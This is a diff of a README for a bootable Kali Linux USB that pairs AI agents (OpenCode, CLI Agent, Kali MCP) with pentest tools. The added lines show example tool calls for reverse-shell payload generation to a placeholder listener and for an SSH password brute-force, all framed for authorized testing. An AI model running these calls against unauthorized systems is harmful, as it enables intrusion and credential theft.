@@ -2,12 +2,13 @@
 
 > **Boot anywhere. Pentest everything. Leave no trace.**
 
-A bootable USB drive combining **Kali Linux Live** with **OpenCode AI automation** for portable, automated penetration testing. Includes optional **CLI Agent** for local/offline AI assistance.
+A bootable USB drive combining **Kali Linux Live** with **AI-powered pentesting tools**: OpenCode, CLI Agent, and Kali MCP for portable, automated penetration testing.
 
 [![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 [![Kali](https://img.shields.io/badge/Kali-2025.1-blue)](https://kali.org)
 [![OpenCode](https://img.shields.io/badge/OpenCode-latest-green)](https://opencode.ai)
 [![CLI Agent](https://img.shields.io/badge/CLI%20Agent-v1.2.6-orange)](https://github.com/amranu/cli-agent)
+[![Kali MCP](https://img.shields.io/badge/Kali%20MCP-35%2B%20tools-red)](https://github.com/k3nn3dy-ai/kali-mcp)
 
 ---
 
@@ -18,77 +19,26 @@ Traditional pentesting workflow problems:
 | Problem | This Solution |
 |---------|---------------|
 | Tools scattered across machines | Single USB, everything pre-configured |
-| Manual, repetitive recon workflows | OpenCode + CLI Agent automate workflows |
+| Manual, repetitive recon workflows | AI tools automate workflows |
 | Forgetting to document findings | Auto-documentation and memory files |
 | Leaving traces on client systems | Boot Live USB, nothing touches host disk |
-| API dependency for AI tools | CLI Agent works offline with local models |
-| Different environments per engagement | Consistent rig every time |
+| API dependency for AI tools | CLI Agent works offline with Ollama |
+| Learning curve for tools | Kali MCP exposes 35+ tools via AI |
 
 ---
 
 ## 📦 What You Get
 
-- **Full Kali Linux** - Every pentest tool you know (nmap, metasploit, burp, hashcat, etc.)
-- **OpenCode** - Modern AI CLI with native MCP support, web interface, and multi-agent coordination
-- **CLI Agent** - Lightweight AI agent that works offline with Ollama/local models
+- **Full Kali Linux** - Every pentest tool (nmap, metasploit, burp, hashcat, etc.)
+- **OpenCode** - Modern AI CLI with MCP support, web UI, and multi-agent coordination
+- **CLI Agent** - Lightweight AI agent with local Ollama model support
+- **Kali MCP** - 35+ security tools exposed as MCP tools (network scanning, web testing, exploitation, etc.)
 - **Persistence** - Your configs, workflows, and findings survive reboots
-- **Pre-configured Templates** - Network recon, web app testing, wireless audits
-- **Drop-Box Node Support** - Deploy remote nodes on target network
 - **Forensically Clean** - Remove USB, no trace on host (RAM only)
 
 ---
 
-## 🚀 Quick Start
-
-### Build the USB
-
-```bash
-# Clone this repo
-git clone https://github.com/Adarsh1Y/kali-opencode-usb.git
-cd kali-opencode-usb
-
-# Build the USB (REPLACE /dev/sdX with your USB device)
-sudo ./build-usb.sh /dev/sdX
-
-# Wait 10-20 minutes (downloads ~3GB Kali ISO)
-```
-
-### Boot
-
-1. Plug USB into target machine
-2. Boot from USB (F12/Del/Esc for boot menu)
-3. **IMPORTANT:** Select **"Live USB Persistence"** at boot menu
-4. Login: `kali` / `kali` (default Kali credentials)
-
-### First Boot Setup
-
-```bash
-# Run the post-install script
-sudo bash ~/opencode-setup.sh
-
-# Or manually install OpenCode
-curl -fsSL https://opencode.ai/install.sh | bash
-```
-
-### Daily Use
-
-```bash
-# Start OpenCode
-opencode
-
-# Or use CLI Agent with local models (offline capable)
-opencode-agent chat --model ollama:llama3
-
-# Quick commands
-alias opencode-start='opencode serve'
-alias agent-chat='opencode-agent chat'
-```
-
----
-
-## 🤖 AI Tool Options
-
-This USB includes **two** AI tools for maximum flexibility:
+## 🤖 AI Tool Suite
 
 ### OpenCode (Cloud + Local)
 
@@ -98,51 +48,80 @@ opencode
 
 # Open web interface
 opencode web
-
-# MCP server for AI models
-opencode mcp serve
 ```
 
-**Features:**
-- Modern TUI and web interface
-- Native MCP protocol support
-- Multi-agent coordination
-- GitHub integration
-- Session management
+**Features:** TUI, web interface, MCP protocol, multi-agent, GitHub integration
 
 ### CLI Agent (Local-First)
 
 ```bash
-# Start CLI Agent
+# Activate environment
+source ~/cli-agent/.venv/bin/activate
+
+# Start with cloud API
 agent chat
 
-# Or with local Ollama models (no internet needed!)
+# Start with local Ollama (offline!)
 agent chat --model ollama:llama3
 
-# MCP server for exposing models
+# MCP server mode
 python mcp_server.py --stdio
 ```
 
-**Features:**
-- Works completely offline with Ollama
-- Supports: Claude, GPT, DeepSeek, Gemini, OpenRouter, Ollama
-- Built-in tools: file ops, bash, web fetch, grep, glob
-- Subagent spawning for parallel tasks
-- Deep research workflow
+**Features:** Works offline with Ollama, supports Claude/GPT/DeepSeek/Gemini
 
-### Ollama (Local Models)
+### Kali MCP (35+ Security Tools)
+
+```
+# Direct tool usage via MCP
+/port_scan target=192.168.1.1 scan_type=quick
+/dns_enum domain=example.com
+/hydra_attack target=10.0.0.1 service=ssh
+/payload_generate payload_type=reverse_shell platform=linux lhost=YOUR_IP lport=4444
+/recon_auto target=example.com depth=standard
+```
+
+**Tool Categories:**
+| Category | Tools |
+|----------|-------|
+| Network Scanning | port_scan, network_discovery, dns_enum |
+| Web Testing | web_enumeration, vulnerability_scan, spider_website |
+| Exploitation | exploit_search, payload_generate, reverse_shell |
+| Credentials | hydra_attack, credential_store, hash_identify |
+| Reporting | create_report, save_output, file_analysis |
+| Session | session_create, session_list, session_switch |
+
+---
+
+## 🚀 Quick Start
+
+### Build the USB
 
 ```bash
-# Install Ollama
-curl -fsSL https://ollama.com/install.sh | bash
-
-# Pull a model
-ollama pull llama3
-ollama pull codellama
-
-# Use with CLI Agent
-agent chat --model ollama:llama3
+git clone https://github.com/Adarsh1Y/kali-opencode-usb.git
+cd kali-opencode-usb
+sudo ./build-usb.sh /dev/sdX
+# Wait 10-20 minutes (downloads ~3GB Kali ISO)
 ```
+
+### Boot
+
+1. Plug USB into target machine
+2. Boot from USB (F12/Del/Esc for boot menu)
+3. Select **"Live USB Persistence"**
+4. Login: `kali` / `kali`
+
+### First Boot Setup
+
+```bash
+sudo bash ~/opencode-setup.sh
+```
+
+This installs:
+- OpenCode
+- CLI Agent
+- Kali MCP
+- Ollama (optional)
 
 ---
 
@@ -150,127 +129,96 @@ agent chat --model ollama:llama3
 
 ```
 kali-opencode-usb/
-├── build-usb.sh              # Main build script
+├── build-usb.sh              # USB builder script
+├── kali-mcp/                 # Kali MCP Server (35+ tools)
+│   ├── kali_mcp_server/      # MCP tools implementation
+│   ├── Dockerfile            # Docker container
+│   └── README.md             # Kali MCP docs
+├── cli-agent/                # CLI Agent (from ~/cli-agent)
 ├── postinstall/
 │   ├── opencode-setup.sh     # First-boot setup
 │   └── README-OPENCODE.txt   # Quick reference
-├── templates/
-│   ├── recon-network.md      # Network reconnaissance
-│   ├── recon-web.md          # Web app testing
-│   └── recon-wifi.md         # Wireless audits
 ├── scripts/
-│   ├── backup-config.sh      # Backup before removing USB
-│   └── deploy-node.sh        # Deploy drop-box nodes
-├── docs/
-│   ├── USAGE.md              # Detailed usage guide
-│   ├── SECURITY.md           # Security considerations
-│   └── TROUBLESHOOTING.md    # Common issues
-└── README.md                 # This file
+│   ├── backup-config.sh
+│   └── deploy-node.sh
+└── docs/
+    ├── USAGE.md
+    └── SECURITY.md
 ```
 
 ---
 
-## 🎯 Use Cases
+## 🔧 MCP Configuration
 
-### 1. On-Site Penetration Testing
+OpenCode is pre-configured with both MCP servers:
 
-```bash
-# Boot USB on your laptop at client site
-opencode
-
-# Run AI-assisted network recon
-# Use OpenCode's TUI or CLI Agent for guidance
-
-# Document findings in real-time
-write path="memory/client-engagement.md" content="..."
-```
-
-### 2. Offline/Air-Gapped Testing
-
-```bash
-# Install Ollama with models before engagement
-ollama pull llama3
-ollama pull codellama
-
-# Use CLI Agent offline
-agent chat --model ollama:llama3
-
-# All AI assistance works without internet
-```
-
-### 3. Remote Node Orchestration
-
-```bash
-# Deploy node on target network machine
-opencode node run --host <your-kali-ip> --port 18789 --display-name "Target-Box"
-
-# Approve on your USB gateway
-opencode nodes approve <requestId>
-
-# Run scans remotely
-opencode nodes run --node "Target-Box" -- nmap -sV 192.168.1.0/24
-```
-
-### 4. Security Audits + Compliance
-
-```bash
-# Automated documentation
-# All tool outputs captured in memory files
-
-# Backup findings
-./backup-config.sh
-
-# Sync to secure storage
-rsync -avz ~/.opencode/workspace/backups user@vps:/secure/
+```jsonc
+// ~/.config/opencode/opencode.jsonc
+{
+  "mcp": {
+    "cli-agent": {
+      "type": "local",
+      "command": ["~/cli-agent/.venv/bin/python", "~/cli-agent/mcp_server.py"],
+      "enabled": true
+    },
+    "kali-mcp": {
+      "type": "local",
+      "command": ["~/kali-mcp/.venv/bin/python", "-m", "kali_mcp_server"],
+      "enabled": true
+    }
+  }
+}
 ```
 
 ---
 
-## 🛠️ Pre-Configured Tools
+## 🛠️ Kali MCP Tools (35+)
 
-The build script pre-configures OpenCode to allow these common pentest tools:
+### Network Tools
+```bash
+/port_scan target=192.168.1.1 scan_type=full
+/network_discovery target=192.168.1.0/24 discovery_type=comprehensive
+/dns_enum domain=example.com record_types=a,mx,ns,txt
+/subdomain_enum url=https://example.com
+```
 
-| Tool | Purpose |
-|------|---------|
-| `nmap` | Network discovery + port scanning |
-| `sqlmap` | SQL injection testing |
-| `burpsuite` | Web app proxy + scanner |
-| `metasploit` | Exploitation framework |
-| `hashcat` | Password cracking |
-| `john` | John the Ripper |
-| `gobuster` | Directory enumeration |
-| `nikto` | Web server scanning |
-| `wfuzz` | Web fuzzing |
-| `dirb` | Directory brute-forcing |
-| `hydra` | Online password cracking |
-| `netcat` | Network utility |
+### Web Application
+```bash
+/web_enumeration target=http://example.com enumeration_type=full
+/vulnerability_scan target=example.com scan_type=comprehensive
+/spider_website url=https://example.com depth=3
+/header_analysis url=https://example.com
+/ssl_analysis url=https://example.com port=443
+```
 
----
+### Exploitation
+```bash
+/exploit_search search_term="apache 2.4" search_type=web
+/payload_generate payload_type=reverse_shell platform=linux lhost=YOUR_IP lport=4444 format=elf
+/reverse_shell lhost=YOUR_IP shell_type=bash lport=4444
+```
 
-## 🔐 Security Considerations
+### Credentials
+```bash
+/hydra_attack target=192.168.1.1 service=ssh username=admin passlist=/usr/share/wordlists/rockyou.txt
+/hash_identify hash_value=5d41402abc4b2a76b9719d911017c592
+/encode_decode data="hello" operation=encode format=base64
+```
 
-### Legal
+### Session Management
+```bash
+/session_create session_name="client-audit" description="Q1 audit" target=example.com
+/session_list
+/session_switch session_name="client-audit"
+/session_status
+```
 
-> ⚠️ **Only test systems you have written authorization to test.**
-
-- Document all authorization in memory files
-- Keep engagement letters in `workspace/authorization/`
-- This is a powerful tool — use responsibly
-
-### Operational Security
-
-- **Encrypt persistence partition** for sensitive engagements
-- **Never leave USB unattended**
-- **Use TLS** for gateway connections
-- **Consider panic-wipe script** for high-risk scenarios
-- **Use a VPS gateway** instead of running on USB for remote operations
-
-### Technical
-
-- USB 3.0+ **strongly recommended** (2.0 is painfully slow)
-- **32GB+ drive minimum** (Kali + tools + persistence)
-- **SSD-based USB drives** (Samsung Fit, etc.) much faster than flash
-- **Always safely shutdown** — don't just yank USB!
+### Reporting
+```bash
+/create_report title="Security Assessment" findings="..." report_type=markdown
+/save_output content="..." filename="notes" category="general"
+/file_analysis filepath=/path/to/file
+```
 
 ---
 
@@ -282,10 +230,12 @@ The build script pre-configures OpenCode to allow these common pentest tools:
 ├─────────────────────────────────────────────────────────┤
 │  [EFI Boot]  - Kali bootloader                        │
 │  [Live ISO]  - Read-only Kali base system             │
-│  [Persist]   - /home/kali/.opencode/                  │
-│                - /home/kali/.config/opencode/          │
-│                - Your configs, workspace, keys          │
-│                - Ollama models (if downloaded)          │
+│  [Persist]   - /home/kali/                           │
+│     ├── .opencode/        - OpenCode config           │
+│     ├── .config/opencode/ - MCP servers config        │
+│     ├── cli-agent/        - CLI Agent                 │
+│     ├── kali-mcp/         - Kali MCP Server           │
+│     └── .openclaw/        - Ollama models (optional)   │
 └─────────────────────────────────────────────────────────┘
                            │
                            │ Boot on any x64 machine
@@ -293,132 +243,42 @@ The build script pre-configures OpenCode to allow these common pentest tools:
 ┌─────────────────────────────────────────────────────────┐
 │              Your Portable Pentest Rig                  │
 │  • Full Kali toolset                                  │
-│  • OpenCode (cloud + local AI)                       │
-│  • CLI Agent (offline-first AI)                      │
-│  • Ollama support (local models)                     │
-│  • Pre-configured workflows                          │
-│  • Auto-documentation                                │
+│  • OpenCode (cloud AI + orchestration)                │
+│  • CLI Agent (offline AI with Ollama)                │
+│  • Kali MCP (35+ security tools via AI)              │
 │  • Nothing touches host disk                         │
 └─────────────────────────────────────────────────────────┘
 ```
 
 ---
 
-## 📚 Documentation
+## 🔐 Security Considerations
 
-- **[USAGE.md](docs/USAGE.md)** - Detailed usage guide
-- **[SECURITY.md](docs/SECURITY.md)** - Security best practices
-- **[TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md)** - Common issues + fixes
+> ⚠️ **Only test systems you have written authorization to test.**
 
----
-
-## 🤝 Contributing
-
-This is a **starter template**. Make it yours:
-
-1. **Add your workflow templates** - Every engagement is different
-2. **Customize bash aliases** - Build your muscle memory
-3. **Add pre-approved tools** - Your toolkit, your rules
-4. **Build automation scripts** - Common engagements → one command
-5. **Share back** - Submit PRs for useful additions
-
-### Ideas for Extensions
-
-- [ ] Encrypted persistence partition setup
-- [ ] Auto-sync to secure cloud storage
-- [ ] Pre-configured VPS gateway deployment
-- [ ] Hardware token integration (YubiKey)
-- [ ] Panic-wipe script for emergencies
-- [ ] Custom Kali ISO with OpenCode + CLI Agent pre-installed
-- [ ] Docker-based alternative build
-
----
-
-## 🐛 Troubleshooting
-
-### Persistence not working
-```bash
-# Verify you selected "Live USB Persistence" at boot
-cat /persistence/persistence.conf  # Should contain: "/ union"
-```
-
-### OpenCode won't start
-```bash
-# Check installation
-opencode --version
-
-# Reinstall OpenCode
-curl -fsSL https://opencode.ai/install.sh | bash
-```
-
-### CLI Agent won't start
-```bash
-# Check Python environment
-which python3 && python3 --version
-
-# Reinstall CLI Agent
-cd ~/cli-agent && pip install -e .
-```
-
-### Gateway won't bind to port
-```bash
-# Check if port is in use
-netstat -tlnp | grep 18789
-
-# Change port in OpenCode config
-```
-
-### USB not booting
-- Try different USB port (USB 3.0 vs 2.0)
-- Disable Secure Boot in BIOS
-- Try Rufus (Windows) or Etcher (Mac/Linux) to write ISO
-
----
-
-## 📜 License
-
-**MIT License** — Do what you want, just don't be evil.
-
-```
-Copyright (c) 2026 [Your Name]
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-```
+- Encrypt persistence partition for sensitive engagements
+- Never leave USB unattended
+- Use VPN for remote connections
+- Document all authorization in memory files
 
 ---
 
 ## 🙏 Credits
 
 Built with:
-- **[Kali Linux](https://kali.org)** - The penetration testing distribution
-- **[OpenCode](https://opencode.ai)** - Modern AI CLI for developers
-- **[CLI Agent](https://github.com/amranu/cli-agent)** - MCP-enabled AI assistant with local model support
-- **[Ollama](https://ollama.com)** - Local AI model runtime
+- **[Kali Linux](https://kali.org)** - Penetration testing distribution
+- **[OpenCode](https://opencode.ai)** - Modern AI CLI
+- **[CLI Agent](https://github.com/amranu/cli-agent)** - MCP-enabled AI assistant
+- **[Kali MCP](https://github.com/k3nn3dy-ai/kali-mcp)** - 35+ security tools via MCP
+- **[Ollama](https://ollama.com)** - Local AI runtime
 
 ---
 
 ## 📬 Contact
 
 - **GitHub:** [@Adarsh1Y](https://github.com/Adarsh1Y)
-- **OpenCode Discord:** [OpenCode Community](https://discord.gg/opencode)
-- **Twitter:** [@YOURHANDLE]
+- **Discord:** [OpenCode Community](https://discord.gg/opencode)
 
 ---
 
-> **Disclaimer:** This tool is for authorized security testing only. The authors are not responsible for misuse. Always obtain written permission before testing any system you don't own.
+> **Disclaimer:** This tool is for authorized security testing only.
